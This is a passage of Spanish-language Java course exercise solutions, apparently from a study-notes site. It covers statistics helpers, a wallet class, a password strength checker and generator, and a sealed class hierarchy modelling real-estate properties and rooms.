cantidadNumeros;\n\t}\n\t\n\tprivate void agrandaArray() {\n\t\tint[] copiaNumeros = numeros.clone();\n\t\tnumeros = Arrays.copyOf(copiaNumeros, copiaNumeros.length+DEFAULT_SIZE);\n\t}\t\n \n}\n \nEstadistica.java\npublic class Estadistica {\n\t\n\tpublic static double media(Muestra m) {\n\t\treturn media(m.getNumeros(), m.getCantidadNumeros());\n\t}\n\t\n\tpublic static double media(int[] array) {\n\t\treturn media(array, array.length);\n\t}\n\t\n\tprivate static double media(int[] array, int cantidad) {\n\t\tdouble suma = 0;\n\t\tfor(int i = 0; i &lt; cantidad; i++) {\n\t\t\tsuma += array[i];\n\t\t}\n\t\t\n\t\treturn suma / cantidad;\n\t}\n\t\n\tpublic static int moda(Muestra m) {\n\t\tint moda = 0;\n        int maxFrecuencia = 0;\n        int n = m.getCantidadNumeros();\n        int[] numeros = m.getNumeros();\n        \n        for (int i = 0; i &lt; n; i++) {\n        \t// Comparamos cada n√∫mero del array con los dem√°s\n            int frecuencia = 0;\n            for (int j = 0; j &lt; n; j++) {\n                if (numeros[j] == numeros[i]) {\n                    frecuencia++;\n                }\n            }\n            if (frecuencia &gt; maxFrecuencia) {\n                maxFrecuencia = frecuencia;\n                moda = numeros[i];\n            }\n        }\n        return moda;\n\t}\n \n}\n \nEjercicio02.java\npublic class Ejercicio02 {\n \n\tpublic static void main(String[] args) {\n\t\tMuestra m1 = new Muestra(new int[] { 1, 2, 2, 3, 4, 5, 6, 7, 8, 9 });\n\t\tm1.agregarNumero(123);\n\t\tdouble media = Estadistica.media(m1);\n\t\tSystem.out.println(&quot;La media es &quot; + media);\n \n\t\tint moda = Estadistica.moda(m1);\n\t\tSystem.out.println(&quot;La moda es &quot; + moda);\n\t\t\n\t\tvar array = new int[] {1,22,333,4444,55555};\n\t\tdouble mediaArray = Estadistica.media(array);\n\t\tSystem.out.println(&quot;La media del array es &quot; + mediaArray);\n\t\n\t}\n \n}\n \nSoluciones ejercicio 3\npublic class Cartera {\n    private double saldo;\n \n    public Cartera() {\n        this.saldo = 0.0;\n    }\n \n    public Cartera(double saldoInicial) {\n        this.saldo = saldoInicial;\n    }\n \n    public void sacarDinero(double cantidad) {\n        if (saldo == 0) {\n            System.out.println(&quot;NO TIENES SALDO DISPONIBLE.&quot;);\n        } else if (cantidad &lt;= saldo) {\n            saldo -= cantidad;\n        } else {\n            System.out.println(&quot;TU SALDO SE HA QUEDADO A 0.&quot;);\n            saldo = 0;\n        }\n    }\n \n    public double consultarSaldo() {\n        return saldo;\n    }\n \n    public void meterDinero(double cantidad) {\n        saldo += cantidad;\n    }\n}\nEjercicio03.java\npublic class Ejercicio03 {\n    public static void main(String[] args) {\n        Cartera miCartera = new Cartera(50.0);\n        System.out.println(&quot;Mi saldo actual es: &quot; + miCartera.consultarSaldo());\n        miCartera.sacarDinero(20.0);\n        System.out.println(&quot;Mi saldo actual es: &quot; + miCartera.consultarSaldo());\n        miCartera.meterDinero(10.0);\n        System.out.println(&quot;Mi saldo actual es: &quot; + miCartera.consultarSaldo());\n        miCartera.sacarDinero(100.0);\n        System.out.println(&quot;Mi saldo actual es: &quot; + miCartera.consultarSaldo());\n    }\n}\nSoluciones ejercicio 4\nPassword.java\nimport java.util.Random;\n \npublic class Password {\n\t\n\tprivate String password;\n\t\n\tpublic Password() {\n\t\tthis.password = &quot;&quot;;\n\t}\n\t\n\tpublic Password(String password) {\n\t\tthis.password = password;\n\t}\n\t\n\tpublic int longitud() {\n\t\treturn this.password.length();\n\t}\n\t\n\tpublic String getPassword() {\n\t\treturn password;\n\t}\n \n\tpublic void setPassword(String password) {\n\t\tthis.password = password;\n\t}\n\t\n\tpublic boolean isStrong() {\n\t\tboolean tieneMayusculas = false;\n\t\tboolean tieneMinusculas = false;\n\t\tboolean tieneDigitos = false;\n\t\tboolean tieneCaracterRaro = false;\n\t\tboolean tieneLongitud = false;\n\t\t\t\t\n\t\t// Comprobamos si cumple la lontigud marcada\n\t\t\n\t\tif (password.length() &gt;= 8 &amp;&amp; password.length() &lt;= 20)\n\t\t\ttieneLongitud = true;\n\t\t\n\t\t// Verificamos la contrase√±a caracter a caracter\n\t\t\n\t\tfor(int i = 0; i &lt; password.length(); i++) {\n\t\t\tchar c = password.charAt(i);\n\t\t\t\n\t\t\tif (Character.isUpperCase(c))\n\t\t\t\ttieneMayusculas = true;\n\t\t\t\n\t\t\tif (Character.isLowerCase(c))\n\t\t\t\ttieneMinusculas = true;\n\t\t\t\n\t\t\tif (Character.isDigit(c))\n\t\t\t\ttieneDigitos = true;\n\t\t\t\n\t\t\tif (c == &#039;$&#039; || c == &#039;%&#039; || c == &#039;_&#039; || c == &#039;*&#039;)\n\t\t\t\ttieneCaracterRaro = true;\n\t\t\t\n\t\t}\n\t\t\t\n\t\t\n\t\treturn (tieneMayusculas &amp;&amp; tieneMinusculas \n\t\t\t\t&amp;&amp; tieneDigitos &amp;&amp; tieneCaracterRaro\n\t\t\t\t&amp;&amp; tieneLongitud); \n\t}\n \n\tpublic static Password generatePassword(int longitud) {\n\t\t\n\t\t// Posibles caracteres a usar\n\t\tchar[] caracteres = {&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;, &#039;g&#039;, &#039;h&#039;, &#039;i&#039;, &#039;j&#039;, &#039;k&#039;, &#039;l&#039;, &#039;m&#039;, &#039;n&#039;, &#039;o&#039;, &#039;p&#039;, &#039;q&#039;, &#039;r&#039;, &#039;s&#039;, &#039;t&#039;, &#039;u&#039;, &#039;v&#039;, &#039;w&#039;, &#039;x&#039;, &#039;y&#039;, &#039;z&#039;,\n                &#039;A&#039;, &#039;B&#039;, &#039;C&#039;, &#039;D&#039;, &#039;E&#039;, &#039;F&#039;, &#039;G&#039;, &#039;H&#039;, &#039;I&#039;, &#039;J&#039;, &#039;K&#039;, &#039;L&#039;, &#039;M&#039;, &#039;N&#039;, &#039;O&#039;, &#039;P&#039;, &#039;Q&#039;, &#039;R&#039;, &#039;S&#039;, &#039;T&#039;, &#039;U&#039;, &#039;V&#039;, &#039;W&#039;, &#039;X&#039;, &#039;Y&#039;, &#039;Z&#039;,\n                &#039;0&#039;, &#039;1&#039;, &#039;2&#039;, &#039;3&#039;, &#039;4&#039;, &#039;5&#039;, &#039;6&#039;, &#039;7&#039;, &#039;8&#039;, &#039;9&#039;, &#039;$&#039;, &#039;;&#039;, &#039;.&#039;, &#039;_&#039;, &#039;-&#039;,&#039;*&#039;, &#039;%&#039;};\t\t\n\t\t\n\t\tString resultado = &quot;&quot;;\n\t\t// Para generar n√∫meros aleatorios, podemos usar la clase Random.\n\t\tfor(int i = 0; i &lt; longitud; i++) {\n\t\t\tint aleatorio = new Random().nextInt(caracteres.length);\n\t\t\tresultado += caracteres[aleatorio];\n\t\t}\n\t\t\n\t\treturn new Password(resultado);\n\t\t\n\t}\n \n}\nEjercicio04.java\npublic class Ejercicio04 {\n\t\n\tpublic static void main(String[] args) {\n\t\tPassword nueva = Password.generatePassword(15);\n\t\t\n\t\tSystem.out.println(nueva.getPassword());\n\t\t\n\t\tSystem.out.println(&quot;¬øLa contrase√±a es fuerte? &quot; + (nueva.isStrong() ? &quot;S√ç&quot;: &quot;NO&quot;));\n\t\t\n\t}\n \n}\n "},"DAW/Programaci√≥n/Ejercicios-Java/Soluciones/Soluciones-bolet√≠n-3":{"title":"Soluciones bolet√≠n 3","links":[],"tags":[],"content":"Soluciones ejercicio 1\nInmueble.java\npackage herencia;\n \nimport java.util.Objects;\n \npublic abstract sealed class Inmueble permits Local, InmuebleVivienda {\n\t\n\tprotected int identificadorInmobiliario;\n\tprotected String direccion;\n\tprotected double precioVenta;\n\tprotected double metrosCuadrados;\n\t\n\tpublic Inmueble() { }\n\t\n\tpublic Inmueble(int identificadorInmobiliario, String direccion, double precioVenta, double metrosCuadrados) {\n\t\tthis.identificadorInmobiliario = identificadorInmobiliario;\n\t\tthis.direccion = direccion;\n\t\tthis.precioVenta = precioVenta;\n\t\tthis.metrosCuadrados = metrosCuadrados;\n\t}\n \n\tpublic int getIdentificadorInmobiliario() {\n\t\treturn identificadorInmobiliario;\n\t}\n \n\tpublic String getDireccion() {\n\t\treturn direccion;\n\t}\n \n\tpublic double getPrecioVenta() {\n\t\treturn precioVenta;\n\t}\n \n\tpublic double getMetrosCuadrados() {\n\t\treturn metrosCuadrados;\n\t}\n \n\tpublic void setIdentificadorInmobiliario(int identificadorInmobiliario) {\n\t\tthis.identificadorInmobiliario = identificadorInmobiliario;\n\t}\n \n\tpublic void setDireccion(String direccion) {\n\t\tthis.direccion = direccion;\n\t}\n \n\tpublic void setPrecioVenta(double precioVenta) {\n\t\tthis.precioVenta = precioVenta;\n\t}\n \n\tpublic void setMetrosCuadrados(double metrosCuadrados) {\n\t\tthis.metrosCuadrados = metrosCuadrados;\n\t}\n \n\t@Override\n\tpublic int hashCode() {\n\t\treturn Objects.hash(direccion, identificadorInmobiliario, metrosCuadrados, precioVenta);\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (obj == null)\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tInmueble other = (Inmueble) obj;\n\t\treturn Objects.equals(direccion, other.direccion)\n\t\t\t\t&amp;&amp; identificadorInmobiliario == other.identificadorInmobiliario\n\t\t\t\t&amp;&amp; Double.doubleToLongBits(metrosCuadrados) == Double.doubleToLongBits(other.metrosCuadrados)\n\t\t\t\t&amp;&amp; Double.doubleToLongBits(precioVenta) == Double.doubleToLongBits(other.precioVenta);\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Inmueble [identificadorInmobiliario=&quot; + identificadorInmobiliario + &quot;, direccion=&quot; + direccion\n\t\t\t\t+ &quot;, precioVenta=&quot; + precioVenta + &quot;, metrosCuadrados=&quot; + metrosCuadrados + &quot;]&quot;;\n\t}\n \n}\nLocal.java\npackage herencia;\n \nimport java.util.Objects;\n \npublic final class Local extends Inmueble {\n\t\n\tprivate boolean tieneSalidaHumos;\n \n\t\n\tpublic Local() { }\n\t\n\tpublic Local(int identificadorInmobiliario, String direccion, double precioVenta, double metrosCuadrados,\n\t\t\tboolean tieneSalidaHumos) {\n\t\tsuper(identificadorInmobiliario, direccion, precioVenta, metrosCuadrados);\n\t\tthis.tieneSalidaHumos = tieneSalidaHumos;\n\t}\n \n\tpublic boolean isTieneSalidaHumos() {\n\t\treturn tieneSalidaHumos;\n\t}\n \n\tpublic void setTieneSalidaHumos(boolean tieneSalidaHumos) {\n\t\tthis.tieneSalidaHumos = tieneSalidaHumos;\n\t}\n\t\n\t@Override\n\tpublic int hashCode() {\n\t\tfinal int prime = 31;\n\t\tint result = super.hashCode();\n\t\tresult = prime * result + Objects.hash(tieneSalidaHumos);\n\t\treturn result;\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (!super.equals(obj))\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tLocal other = (Local) obj;\n\t\treturn tieneSalidaHumos == other.tieneSalidaHumos;\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Local [tieneSalidaHumos=&quot; + tieneSalidaHumos + &quot;, identificadorInmobiliario=&quot;\n\t\t\t\t+ identificadorInmobiliario + &quot;, direccion=&quot; + direccion + &quot;, precioVenta=&quot; + precioVenta\n\t\t\t\t+ &quot;, metrosCuadrados=&quot; + metrosCuadrados + &quot;]&quot;;\n\t}\n \n}\n \nInmuebleVivienda.java\npackage herencia;\n \nimport java.util.Arrays;\nimport java.util.Objects;\n \npublic sealed abstract class InmuebleVivienda extends Inmueble permits Casa, Apartamento {\n \n\tprivate static final int MIN_SIZE_HABITACION = 3;\n \n\tprotected Habitacion[] habitaciones;\n\tprotected int numHabitaciones;\n\tprotected int numBanios;\n\t\n \n\tpublic InmuebleVivienda() {\n\t\tsuper();\n\t\thabitaciones = new Habitacion[MIN_SIZE_HABITACION];\n\t\tnumHabitaciones = 0;\n\t}\n\t\n\tpublic InmuebleVivienda(int identificadorInmobiliario, String direccion, double precioVenta, double metrosCuadrados,\n\t\t\tHabitacion[] habitaciones, int numHabitaciones, int numBanios) {\n\t\tsuper(identificadorInmobiliario, direccion, precioVenta, metrosCuadrados);\n\t\t// clonamos el array para obtener una copia limpia\n\t\tthis.habitaciones = habitaciones.clone();\n\t\tthis.numHabitaciones = habitaciones.length;\n\t\tthis.numBanios = numBanios;\n\t}\n \n\tpublic Habitacion[] getHabitaciones() {\n\t\t// Devolvemos una copia y evitamos\n\t\t// que se pueda modificar desde fuera\n\t\t// de la clase\n\t\treturn habitaciones.clone();\n\t}\n\t\n\tpublic void addHabitacion(Habitacion h) {\n\t\tif (habitaciones.length == numHabitaciones) {\n\t\t\thabitaciones = Arrays.copyOf(habitaciones, habitaciones.length+1);\t\t\t\n\t\t}\n\t\thabitaciones[numHabitaciones++] = h;\n\t}\n\t\n\tpublic void removeHabitacion(int index) {\n\t\tif (index &gt; 0 &amp;&amp; index &lt; numHabitaciones) {\n\t\t\thabitaciones[index] = null;\n\t\t\tfor(int i = index+1; i &lt; numHabitaciones-1; i++) {\n\t\t\t\thabitaciones[i] = habitaciones[i+1];\n\t\t\t}\n\t\t\tnumHabitaciones--;\n\t\t}\n\t}\n \n\tpublic int getNumHabitaciones() {\n\t\treturn numHabitaciones;\n\t}\n \n\tpublic int getNumBanios() {\n\t\treturn numBanios;\n\t}\n \n\tpublic void setNumHabitaciones(int numHabitaciones) {\n\t\tthis.numHabitaciones = numHabitaciones;\n\t}\n \n\tpublic void setNumBanios(int numBanios) {\n\t\tthis.numBanios = numBanios;\n\t}\n \n\t@Override\n\tpublic int hashCode() {\n\t\tfinal int prime = 31;\n\t\tint result = super.hashCode();\n\t\tresult = prime * result + Arrays.hashCode(habitaciones);\n\t\tresult = prime * result + Objects.hash(numBanios, numHabitaciones);\n\t\treturn result;\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (!super.equals(obj))\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tInmuebleVivienda other = (InmuebleVivienda) obj;\n\t\treturn Arrays.equals(habitaciones, other.habitaciones) &amp;&amp; numBanios == other.numBanios\n\t\t\t\t&amp;&amp; numHabitaciones == other.numHabitaciones;\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;InmuebleVivienda [habitaciones=&quot; + Arrays.toString(habitaciones) + &quot;, numHabitaciones=&quot;\n\t\t\t\t+ numHabitaciones + &quot;, numBanios=&quot; + numBanios + &quot;, identificadorInmobiliario=&quot;\n\t\t\t\t+ identificadorInmobiliario + &quot;, direccion=&quot; + direccion + &quot;, precioVenta=&quot; + precioVenta\n\t\t\t\t+ &quot;, metrosCuadrados=&quot; + metrosCuadrados + &quot;]&quot;;\n\t}\n}\n \nCasa.java\npackage herencia;\n \nimport java.util.Arrays;\nimport java.util.Objects;\n \npublic final class Casa extends InmuebleVivienda {\n\t\n\tprivate int numPisos;\n\t\n\tpublic Casa() {\n\t\tsuper();\n\t}\n \n\tpublic Casa(int identificadorInmobiliario, String direccion, double precioVenta, double metrosCuadrados,\n\t\t\tHabitacion[] habitaciones, int numHabitaciones, int numBanios, int numPisos) {\n\t\tsuper(identificadorInmobiliario, direccion, precioVenta, metrosCuadrados, habitaciones, numHabitaciones,\n\t\t\t\tnumBanios);\n\t\tthis.numPisos = numPisos;\n\t}\n \n\tpublic int getNumPisos() {\n\t\treturn numPisos;\n\t}\n \n\tpublic void setNumPisos(int numPisos) {\n\t\tthis.numPisos = numPisos;\n\t}\n \n\t@Override\n\tpublic int hashCode() {\n\t\tfinal int prime = 31;\n\t\tint result = super.hashCode();\n\t\tresult = prime * result + Objects.hash(numPisos);\n\t\treturn result;\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (!super.equals(obj))\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tCasa other = (Casa) obj;\n\t\treturn numPisos == other.numPisos;\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Casa [numPisos=&quot; + numPisos + &quot;, habitaciones=&quot; + Arrays.toString(habitaciones) + &quot;, numHabitaciones=&quot;\n\t\t\t\t+ numHabitaciones + &quot;, numBanios=&quot; + numBanios + &quot;, identificadorInmobiliario=&quot;\n\t\t\t\t+ identificadorInmobiliario + &quot;, direccion=&quot; + direccion + &quot;, precioVenta=&quot; + precioVenta\n\t\t\t\t+ &quot;, metrosCuadrados=&quot; + metrosCuadrados + &quot;]&quot;;\n\t}\t\n \n}\n \nHabitacion.java\npackage herencia;\n \nimport java.util.Objects;\n \npublic class Habitacion {\n\t\n\tprivate String uso;\n\tprivate double metrosCuadrados;\n\tprivate int numVentanas;\n\t\n\tpublic Habitacion() {}\n\t\n\tpublic Habitacion(String uso, double metrosCuadrados, int numVentanas) {\n\t\tsuper();\n\t\tthis.uso = uso;\n\t\tthis.metrosCuadrados = metrosCuadrados;\n\t\tthis.numVentanas = numVentanas;\n\t}\n \n\tpublic String getUso() {\n\t\treturn uso;\n\t}\n \n\tpublic double getMetrosCuadrados() {\n\t\treturn metrosCuadrados;\n\t}\n \n\tpublic int getNumVentanas() {\n\t\treturn numVentanas;\n\t}\n \n\tpublic void setUso(String uso) {\n\t\tthis.uso = uso;\n\t}\n \n\tpublic void setMetrosCuadrados(double metrosCuadrados) {\n\t\tthis.metrosCuadrados = metrosCuadrados;\n\t}\n \n\tpublic void setNumVentanas(int numVentanas) {\n\t\tthis.numVentanas = numVentanas;\n\t}\n \n\t@Override\n\tpublic int hashCode() {\n\t\treturn Objects.hash(metrosCuadrados, numVentanas, uso);\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (obj == null)\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tHabitacion other = (Habitacion) obj;\n\t\treturn Double.doubleToLongBits(metrosCuadrados) == Double.doubleToLongBits(other.metrosCuadrados)\n\t\t\t\t&amp;&amp; numVentanas == other.numVentanas &amp;&amp; Objects.equals(uso, other.uso);\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Habitacion [uso=&quot; + uso + &quot;, metrosCuadrados=&quot; + metrosCuadrados + &quot;, numVentanas=&quot; + numVentanas + &quot;]&quot;;\n\t}\n\t\n \n}\n \nApartamento.java\npackage herencia;\n \npublic final class Apartamento extends InmuebleVivienda {\n \n\tpublic Apartamento() {\n\t\tsuper();\n\t}\n \n\tpublic Apartamento(int identificadorInmobiliario, String direccion, double precioVenta, double metrosCuadrados,\n\t\t\tHabitacion[] habitaciones, int numHabitaciones, int numBanios) {\n\t\tsuper(identificadorInmobiliario, direccion, precioVenta, metrosCuadrados, habitaciones, numHabitaciones, numBanios);\n\t}\n\t\n\t\n \n}\n \nApp.java\npackage herencia;\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n\t\t\n\t\tLocal l1 = new Local(1, &quot;C/ Rue del Percebe n¬∫ 1&quot;, 250000.0, 110, true);\n\t\t\n\t\tSystem.out.println(l1);\n\t\t\n\t\tCasa c1 = new Casa();\n\t\tc1.setIdentificadorInmobiliario(2);\n\t\tc1.setDireccion(&quot;C/ Rue del Percebe 2&quot;);\n\t\tc1.setPrecioVenta(150000);\n\t\tc1.setMetrosCuadrados(70);\n\t\tc1.setNumBanios(2);\n\t\tc1.addHabitacion(new Habitacion(&quot;Dormitorio&quot;, 13, 1));\n\t\tc1.addHabitacion(new Habitacion(&quot;Dormitorio&quot;, 16, 1));\n\t\tc1.addHabitacion(new Habitacion(&quot;Sal√≥n&quot;, 18, 2));\n\t\tc1.setNumPisos(1);\n\t\t\n\t\tSystem.out.println(c1);\n\t\t\n\t\t\n \n\t}\n \n}\n \nSoluciones ejercicio 2\nInmueble.java\npackage herencia;\n \nimport java.util.Objects;\n \npublic abstract sealed class Inmueble permits Local, InmuebleVivienda {\n\t\n\tprotected int identificadorInmobiliario;\n\tprotected String direccion;\n\tprotected double precioBase;\n\tprotected double metrosCuadrados;\n\t\n\tpublic Inmueble() { }\n\t\n\tpublic Inmueble(int identificadorInmobiliario, String direccion, double precioBase, double metrosCuadrados) {\n\t\tthis.identificadorInmobiliario = identificadorInmobiliario;\n\t\tthis.direccion = direccion;\n\t\tthis.precioBase = precioBase;\n\t\tthis.metrosCuadrados = metrosCuadrados;\n\t}\n \n\tpublic int getIdentificadorInmobiliario() {\n\t\treturn identificadorInmobiliario;\n\t}\n \n\tpublic String getDireccion() {\n\t\treturn direccion;\n\t}\n \n\tpublic double getPrecioBase() {\n\t\treturn precioBase;\n\t}\n \n\tpublic double getMetrosCuadrados() {\n\t\treturn metrosCuadrados;\n\t}\n \n\tpublic void setIdentificadorInmobiliario(int identificadorInmobiliario) {\n\t\tthis.identificadorInmobiliario = identificadorInmobiliario;\n\t}\n \n\tpublic void setDireccion(String direccion) {\n\t\tthis.direccion = direccion;\n\t}\n \n\tpublic void setPrecioBase(double precioBase) {\n\t\tthis.precioBase = precioBase;\n\t}\n \n\tpublic void setMetrosCuadrados(double metrosCuadrados) {\n\t\tthis.metrosCuadrados = metrosCuadrados;\n\t}\n\t\n\tpublic abstract double precioVentaFinal();\n \n\t@Override\n\tpublic int hashCode() {\n\t\treturn Objects.hash(direccion, identificadorInmobiliario, metrosCuadrados, precioBase);\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (obj == null)\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tInmueble other = (Inmueble) obj;\n\t\treturn Objects.equals(direccion, other.direccion)\n\t\t\t\t&amp;&amp; identificadorInmobiliario == other.identificadorInmobiliario\n\t\t\t\t&amp;&amp; Double.doubleToLongBits(metrosCuadrados) == Double.doubleToLongBits(other.metrosCuadrados)\n\t\t\t\t&amp;&amp; Double.doubleToLongBits(precioBase) == Double.doubleToLongBits(other.precioBase);\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Inmueble [identificadorInmobiliario=&quot; + identificadorInmobiliario + &quot;, direccion=&quot; + direccion\n\t\t\t\t+ &quot;, precioBase=&quot; + precioBase + &quot;, metrosCuadrados=&quot; + metrosCuadrados + &quot;]&quot;;\n\t}\n}\n \nLocal.java\npackage herencia;\n \nimport java.util.Objects;\n \npublic final class Local extends Inmueble {\n\t\n\tprivate boolean tieneSalidaHumos;\n\tprivate double porcentajePlusvalia;\n \n\t\n\tpublic Local() { }\n\t\n\t\n \n\tpublic Local(int identificadorInmobiliario, String direccion, double precioBase, double metrosCuadrados,\n\t\t\tboolean tieneSalidaHumos, double porcentajePlusvalia) {\n\t\tsuper(identificadorInmobiliario, direccion, precioBase, metrosCuadrados);\n\t\tthis.tieneSalidaHumos = tieneSalidaHumos;\n\t\tthis.porcentajePlusvalia = porcentajePlusvalia;\n\t}\n \n \n \n\tpublic boolean isTieneSalidaHumos() {\n\t\treturn tieneSalidaHumos;\n\t}\n \n\tpublic void setTieneSalidaHumos(boolean tieneSalidaHumos) {\n\t\tthis.tieneSalidaHumos = tieneSalidaHumos;\n\t}\n \n\tpublic double getPorcentajePlusvalia() {\n\t\treturn porcentajePlusvalia;\n\t}\n \n\tpublic void setPorcentajePlusvalia(double porcentajePlusvalia) {\n\t\tthis.porcentajePlusvalia = porcentajePlusvalia;\n\t}\n \n\t@Override\n\tpublic double precioVentaFinal() {\n\t\t// El % est√° expresado entre 0 y 1\n\t\treturn this.precioBase * (1 + this.porcentajePlusvalia);\n\t}\n \n\t@Override\n\tpublic int hashCode() {\n\t\tfinal int prime = 31;\n\t\tint result = super.hashCode();\n\t\tresult = prime * result + Objects.hash(tieneSalidaHumos);\n\t\treturn result;\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (!super.equals(obj))\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tLocal other = (Local) obj;\n\t\treturn tieneSalidaHumos == other.tieneSalidaHumos;\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Local [tieneSalidaHumos=&quot; + tieneSalidaHumos + &quot;, identificadorInmobiliario=&quot;\n\t\t\t\t+ identificadorInmobiliario + &quot;, direccion=&quot; + direccion + &quot;, precioVenta=&quot; + precioBase\n\t\t\t\t+ &quot;, metrosCuadrados=&quot; + metrosCuadrados + &quot;]&quot;;\n\t}\n \n}\n \nInmuebleVivienda.java\npackage herencia;\n \nimport java.util.Arrays;\nimport java.util.Objects;\n \npublic sealed abstract class InmuebleVivienda extends Inmueble permits Casa, Apartamento {\n \n\tprivate static final int MIN_SIZE_HABITACION = 3;\n \n\tprotected Habitacion[] habitaciones;\n\tprotected int numHabitaciones;\n\tprotected int numBanios;\n\t\n \n\tpublic InmuebleVivienda() {\n\t\tsuper();\n\t\thabitaciones = new Habitacion[MIN_SIZE_HABITACION];\n\t\tnumHabitaciones = 0;\n\t}\n\t\n\tpublic InmuebleVivienda(int identificadorInmobiliario, String direccion, double precioVenta, double metrosCuadrados,\n\t\t\tHabitacion[] habitaciones, int numHabitaciones, int numBanios) {\n\t\tsuper(identificadorInmobiliario, direccion, precioVenta, metrosCuadrados);\n\t\t// clonamos el array para obtener una copia limpia\n\t\tthis.habitaciones = habitaciones.clone();\n\t\tthis.numHabitaciones = habitaciones.length;\n\t\tthis.numBanios = numBanios;\n\t}\n \n\tpublic Habitacion[] getHabitaciones() {\n\t\t// Devolvemos una copia y evitamos\n\t\t// que se pueda modificar desde fuera\n\t\t// de la clase\n\t\treturn habitaciones.clone();\n\t}\n\t\n\tpublic void addHabitacion(Habitacion h) {\n\t\tif (habitaciones.length == numHabitaciones) {\n\t\t\thabitaciones = Arrays.copyOf(habitaciones, habitaciones.length+1);\t\t\t\n\t\t}\n\t\thabitaciones[numHabitaciones++] = h;\n\t}\n\t\n\tpublic void removeHabitacion(int index) {\n\t\tif (index &gt; 0 &amp;&amp; index &lt; numHabitaciones) {\n\t\t\thabitaciones[index] = null;\n\t\t\tfor(int i = index+1; i &lt; numHabitaciones-1; i++) {\n\t\t\t\thabitaciones[i] = habitaciones[i+1];\n\t\t\t}\n\t\t\tnumHabitaciones--;\n\t\t}\n\t}\n \n\tpublic int getNumHabitaciones() {\n\t\treturn numHabitaciones;\n\t}\n \n\tpublic int getNumBanios() {\n\t\treturn numBanios;\n\t}\n \n\tpublic void setNumHabitaciones(int numHabitaciones) {\n\t\tthis.numHabitaciones = numHabitaciones;\n\t}\n \n\tpublic void setNumBanios(int numBanios) {\n\t\tthis.numBanios = numBanios;\n\t}\n\t\n\t\n\t\n\t\n\t@Override\n\tpublic double precioVentaFinal() {\n\t\treturn this.precioBase * 1.21;\n\t}\n \n\t@Override\n\tpublic int hashCode() {\n\t\tfinal int prime = 31;\n\t\tint result = super.hashCode();\n\t\tresult = prime * result + Arrays.hashCode(habitaciones);\n\t\tresult = prime * result + Objects.hash(numBanios, numHabitaciones);\n\t\treturn result;\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (!super.equals(obj))\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tInmuebleVivienda other = (InmuebleVivienda) obj;\n\t\treturn Arrays.equals(habitaciones, other.habitaciones) &amp;&amp; numBanios == other.numBanios\n\t\t\t\t&amp;&amp; numHabitaciones == other.numHabitaciones;\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;InmuebleVivienda [habitaciones=&quot; + Arrays.toString(habitaciones) + &quot;, numHabitaciones=&quot;\n\t\t\t\t+ numHabitaciones + &quot;, numBanios=&quot; + numBanios + &quot;, identificadorInmobiliario=&quot;\n\t\t\t\t+ identificadorInmobiliario + &quot;, direccion=&quot; + direccion + &quot;, precioBase=&quot; + precioBase\n\t\t\t\t+ &quot;, metrosCuadrados=&quot; + metrosCuadrados + &quot;]&quot;;\n\t}\n \n}\n \nApp.java\npackage herencia;\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n\t\t\n\t\tLocal l1 = new Local(1, &quot;C/ Rue del Percebe n¬∫ 1&quot;, 250000.0, 110, true, 0.07);\n\t\t\t\n\t\tCasa c1 = new Casa();\n\t\tc1.setIdentificadorInmobiliario(2);\n\t\tc1.setDireccion(&quot;C/ Rue del Percebe 2&quot;);\n\t\tc1.setPrecioBase(150000);\n\t\tc1.setMetrosCuadrados(70);\n\t\tc1.setNumBanios(2);\n\t\tc1.addHabitacion(new Habitacion(&quot;Dormitorio&quot;, 13, 1));\n\t\tc1.addHabitacion(new Habitacion(&quot;Dormitorio&quot;, 16, 1));\n\t\tc1.addHabitacion(new Habitacion(&quot;Sal√≥n&quot;, 18, 2));\n\t\tc1.setNumPisos(1);\n\t\t\n\t\tApartamento ap1 = new Apartamento();\n\t\tap1.setIdentificadorInmobiliario(3);\n\t\tap1.setDireccion(&quot;C/ Rue del Percebe 3&quot;);\n\t\tap1.setMetrosCuadrados(50);\n\t\tap1.setPrecioBase(120000);\n\t\tap1.setNumBanios(1);\n\t\tap1.addHabitacion(new Habitacion(&quot;Dormitorio&quot;, 14, 1));\n\t\tap1.addHabitacion(new 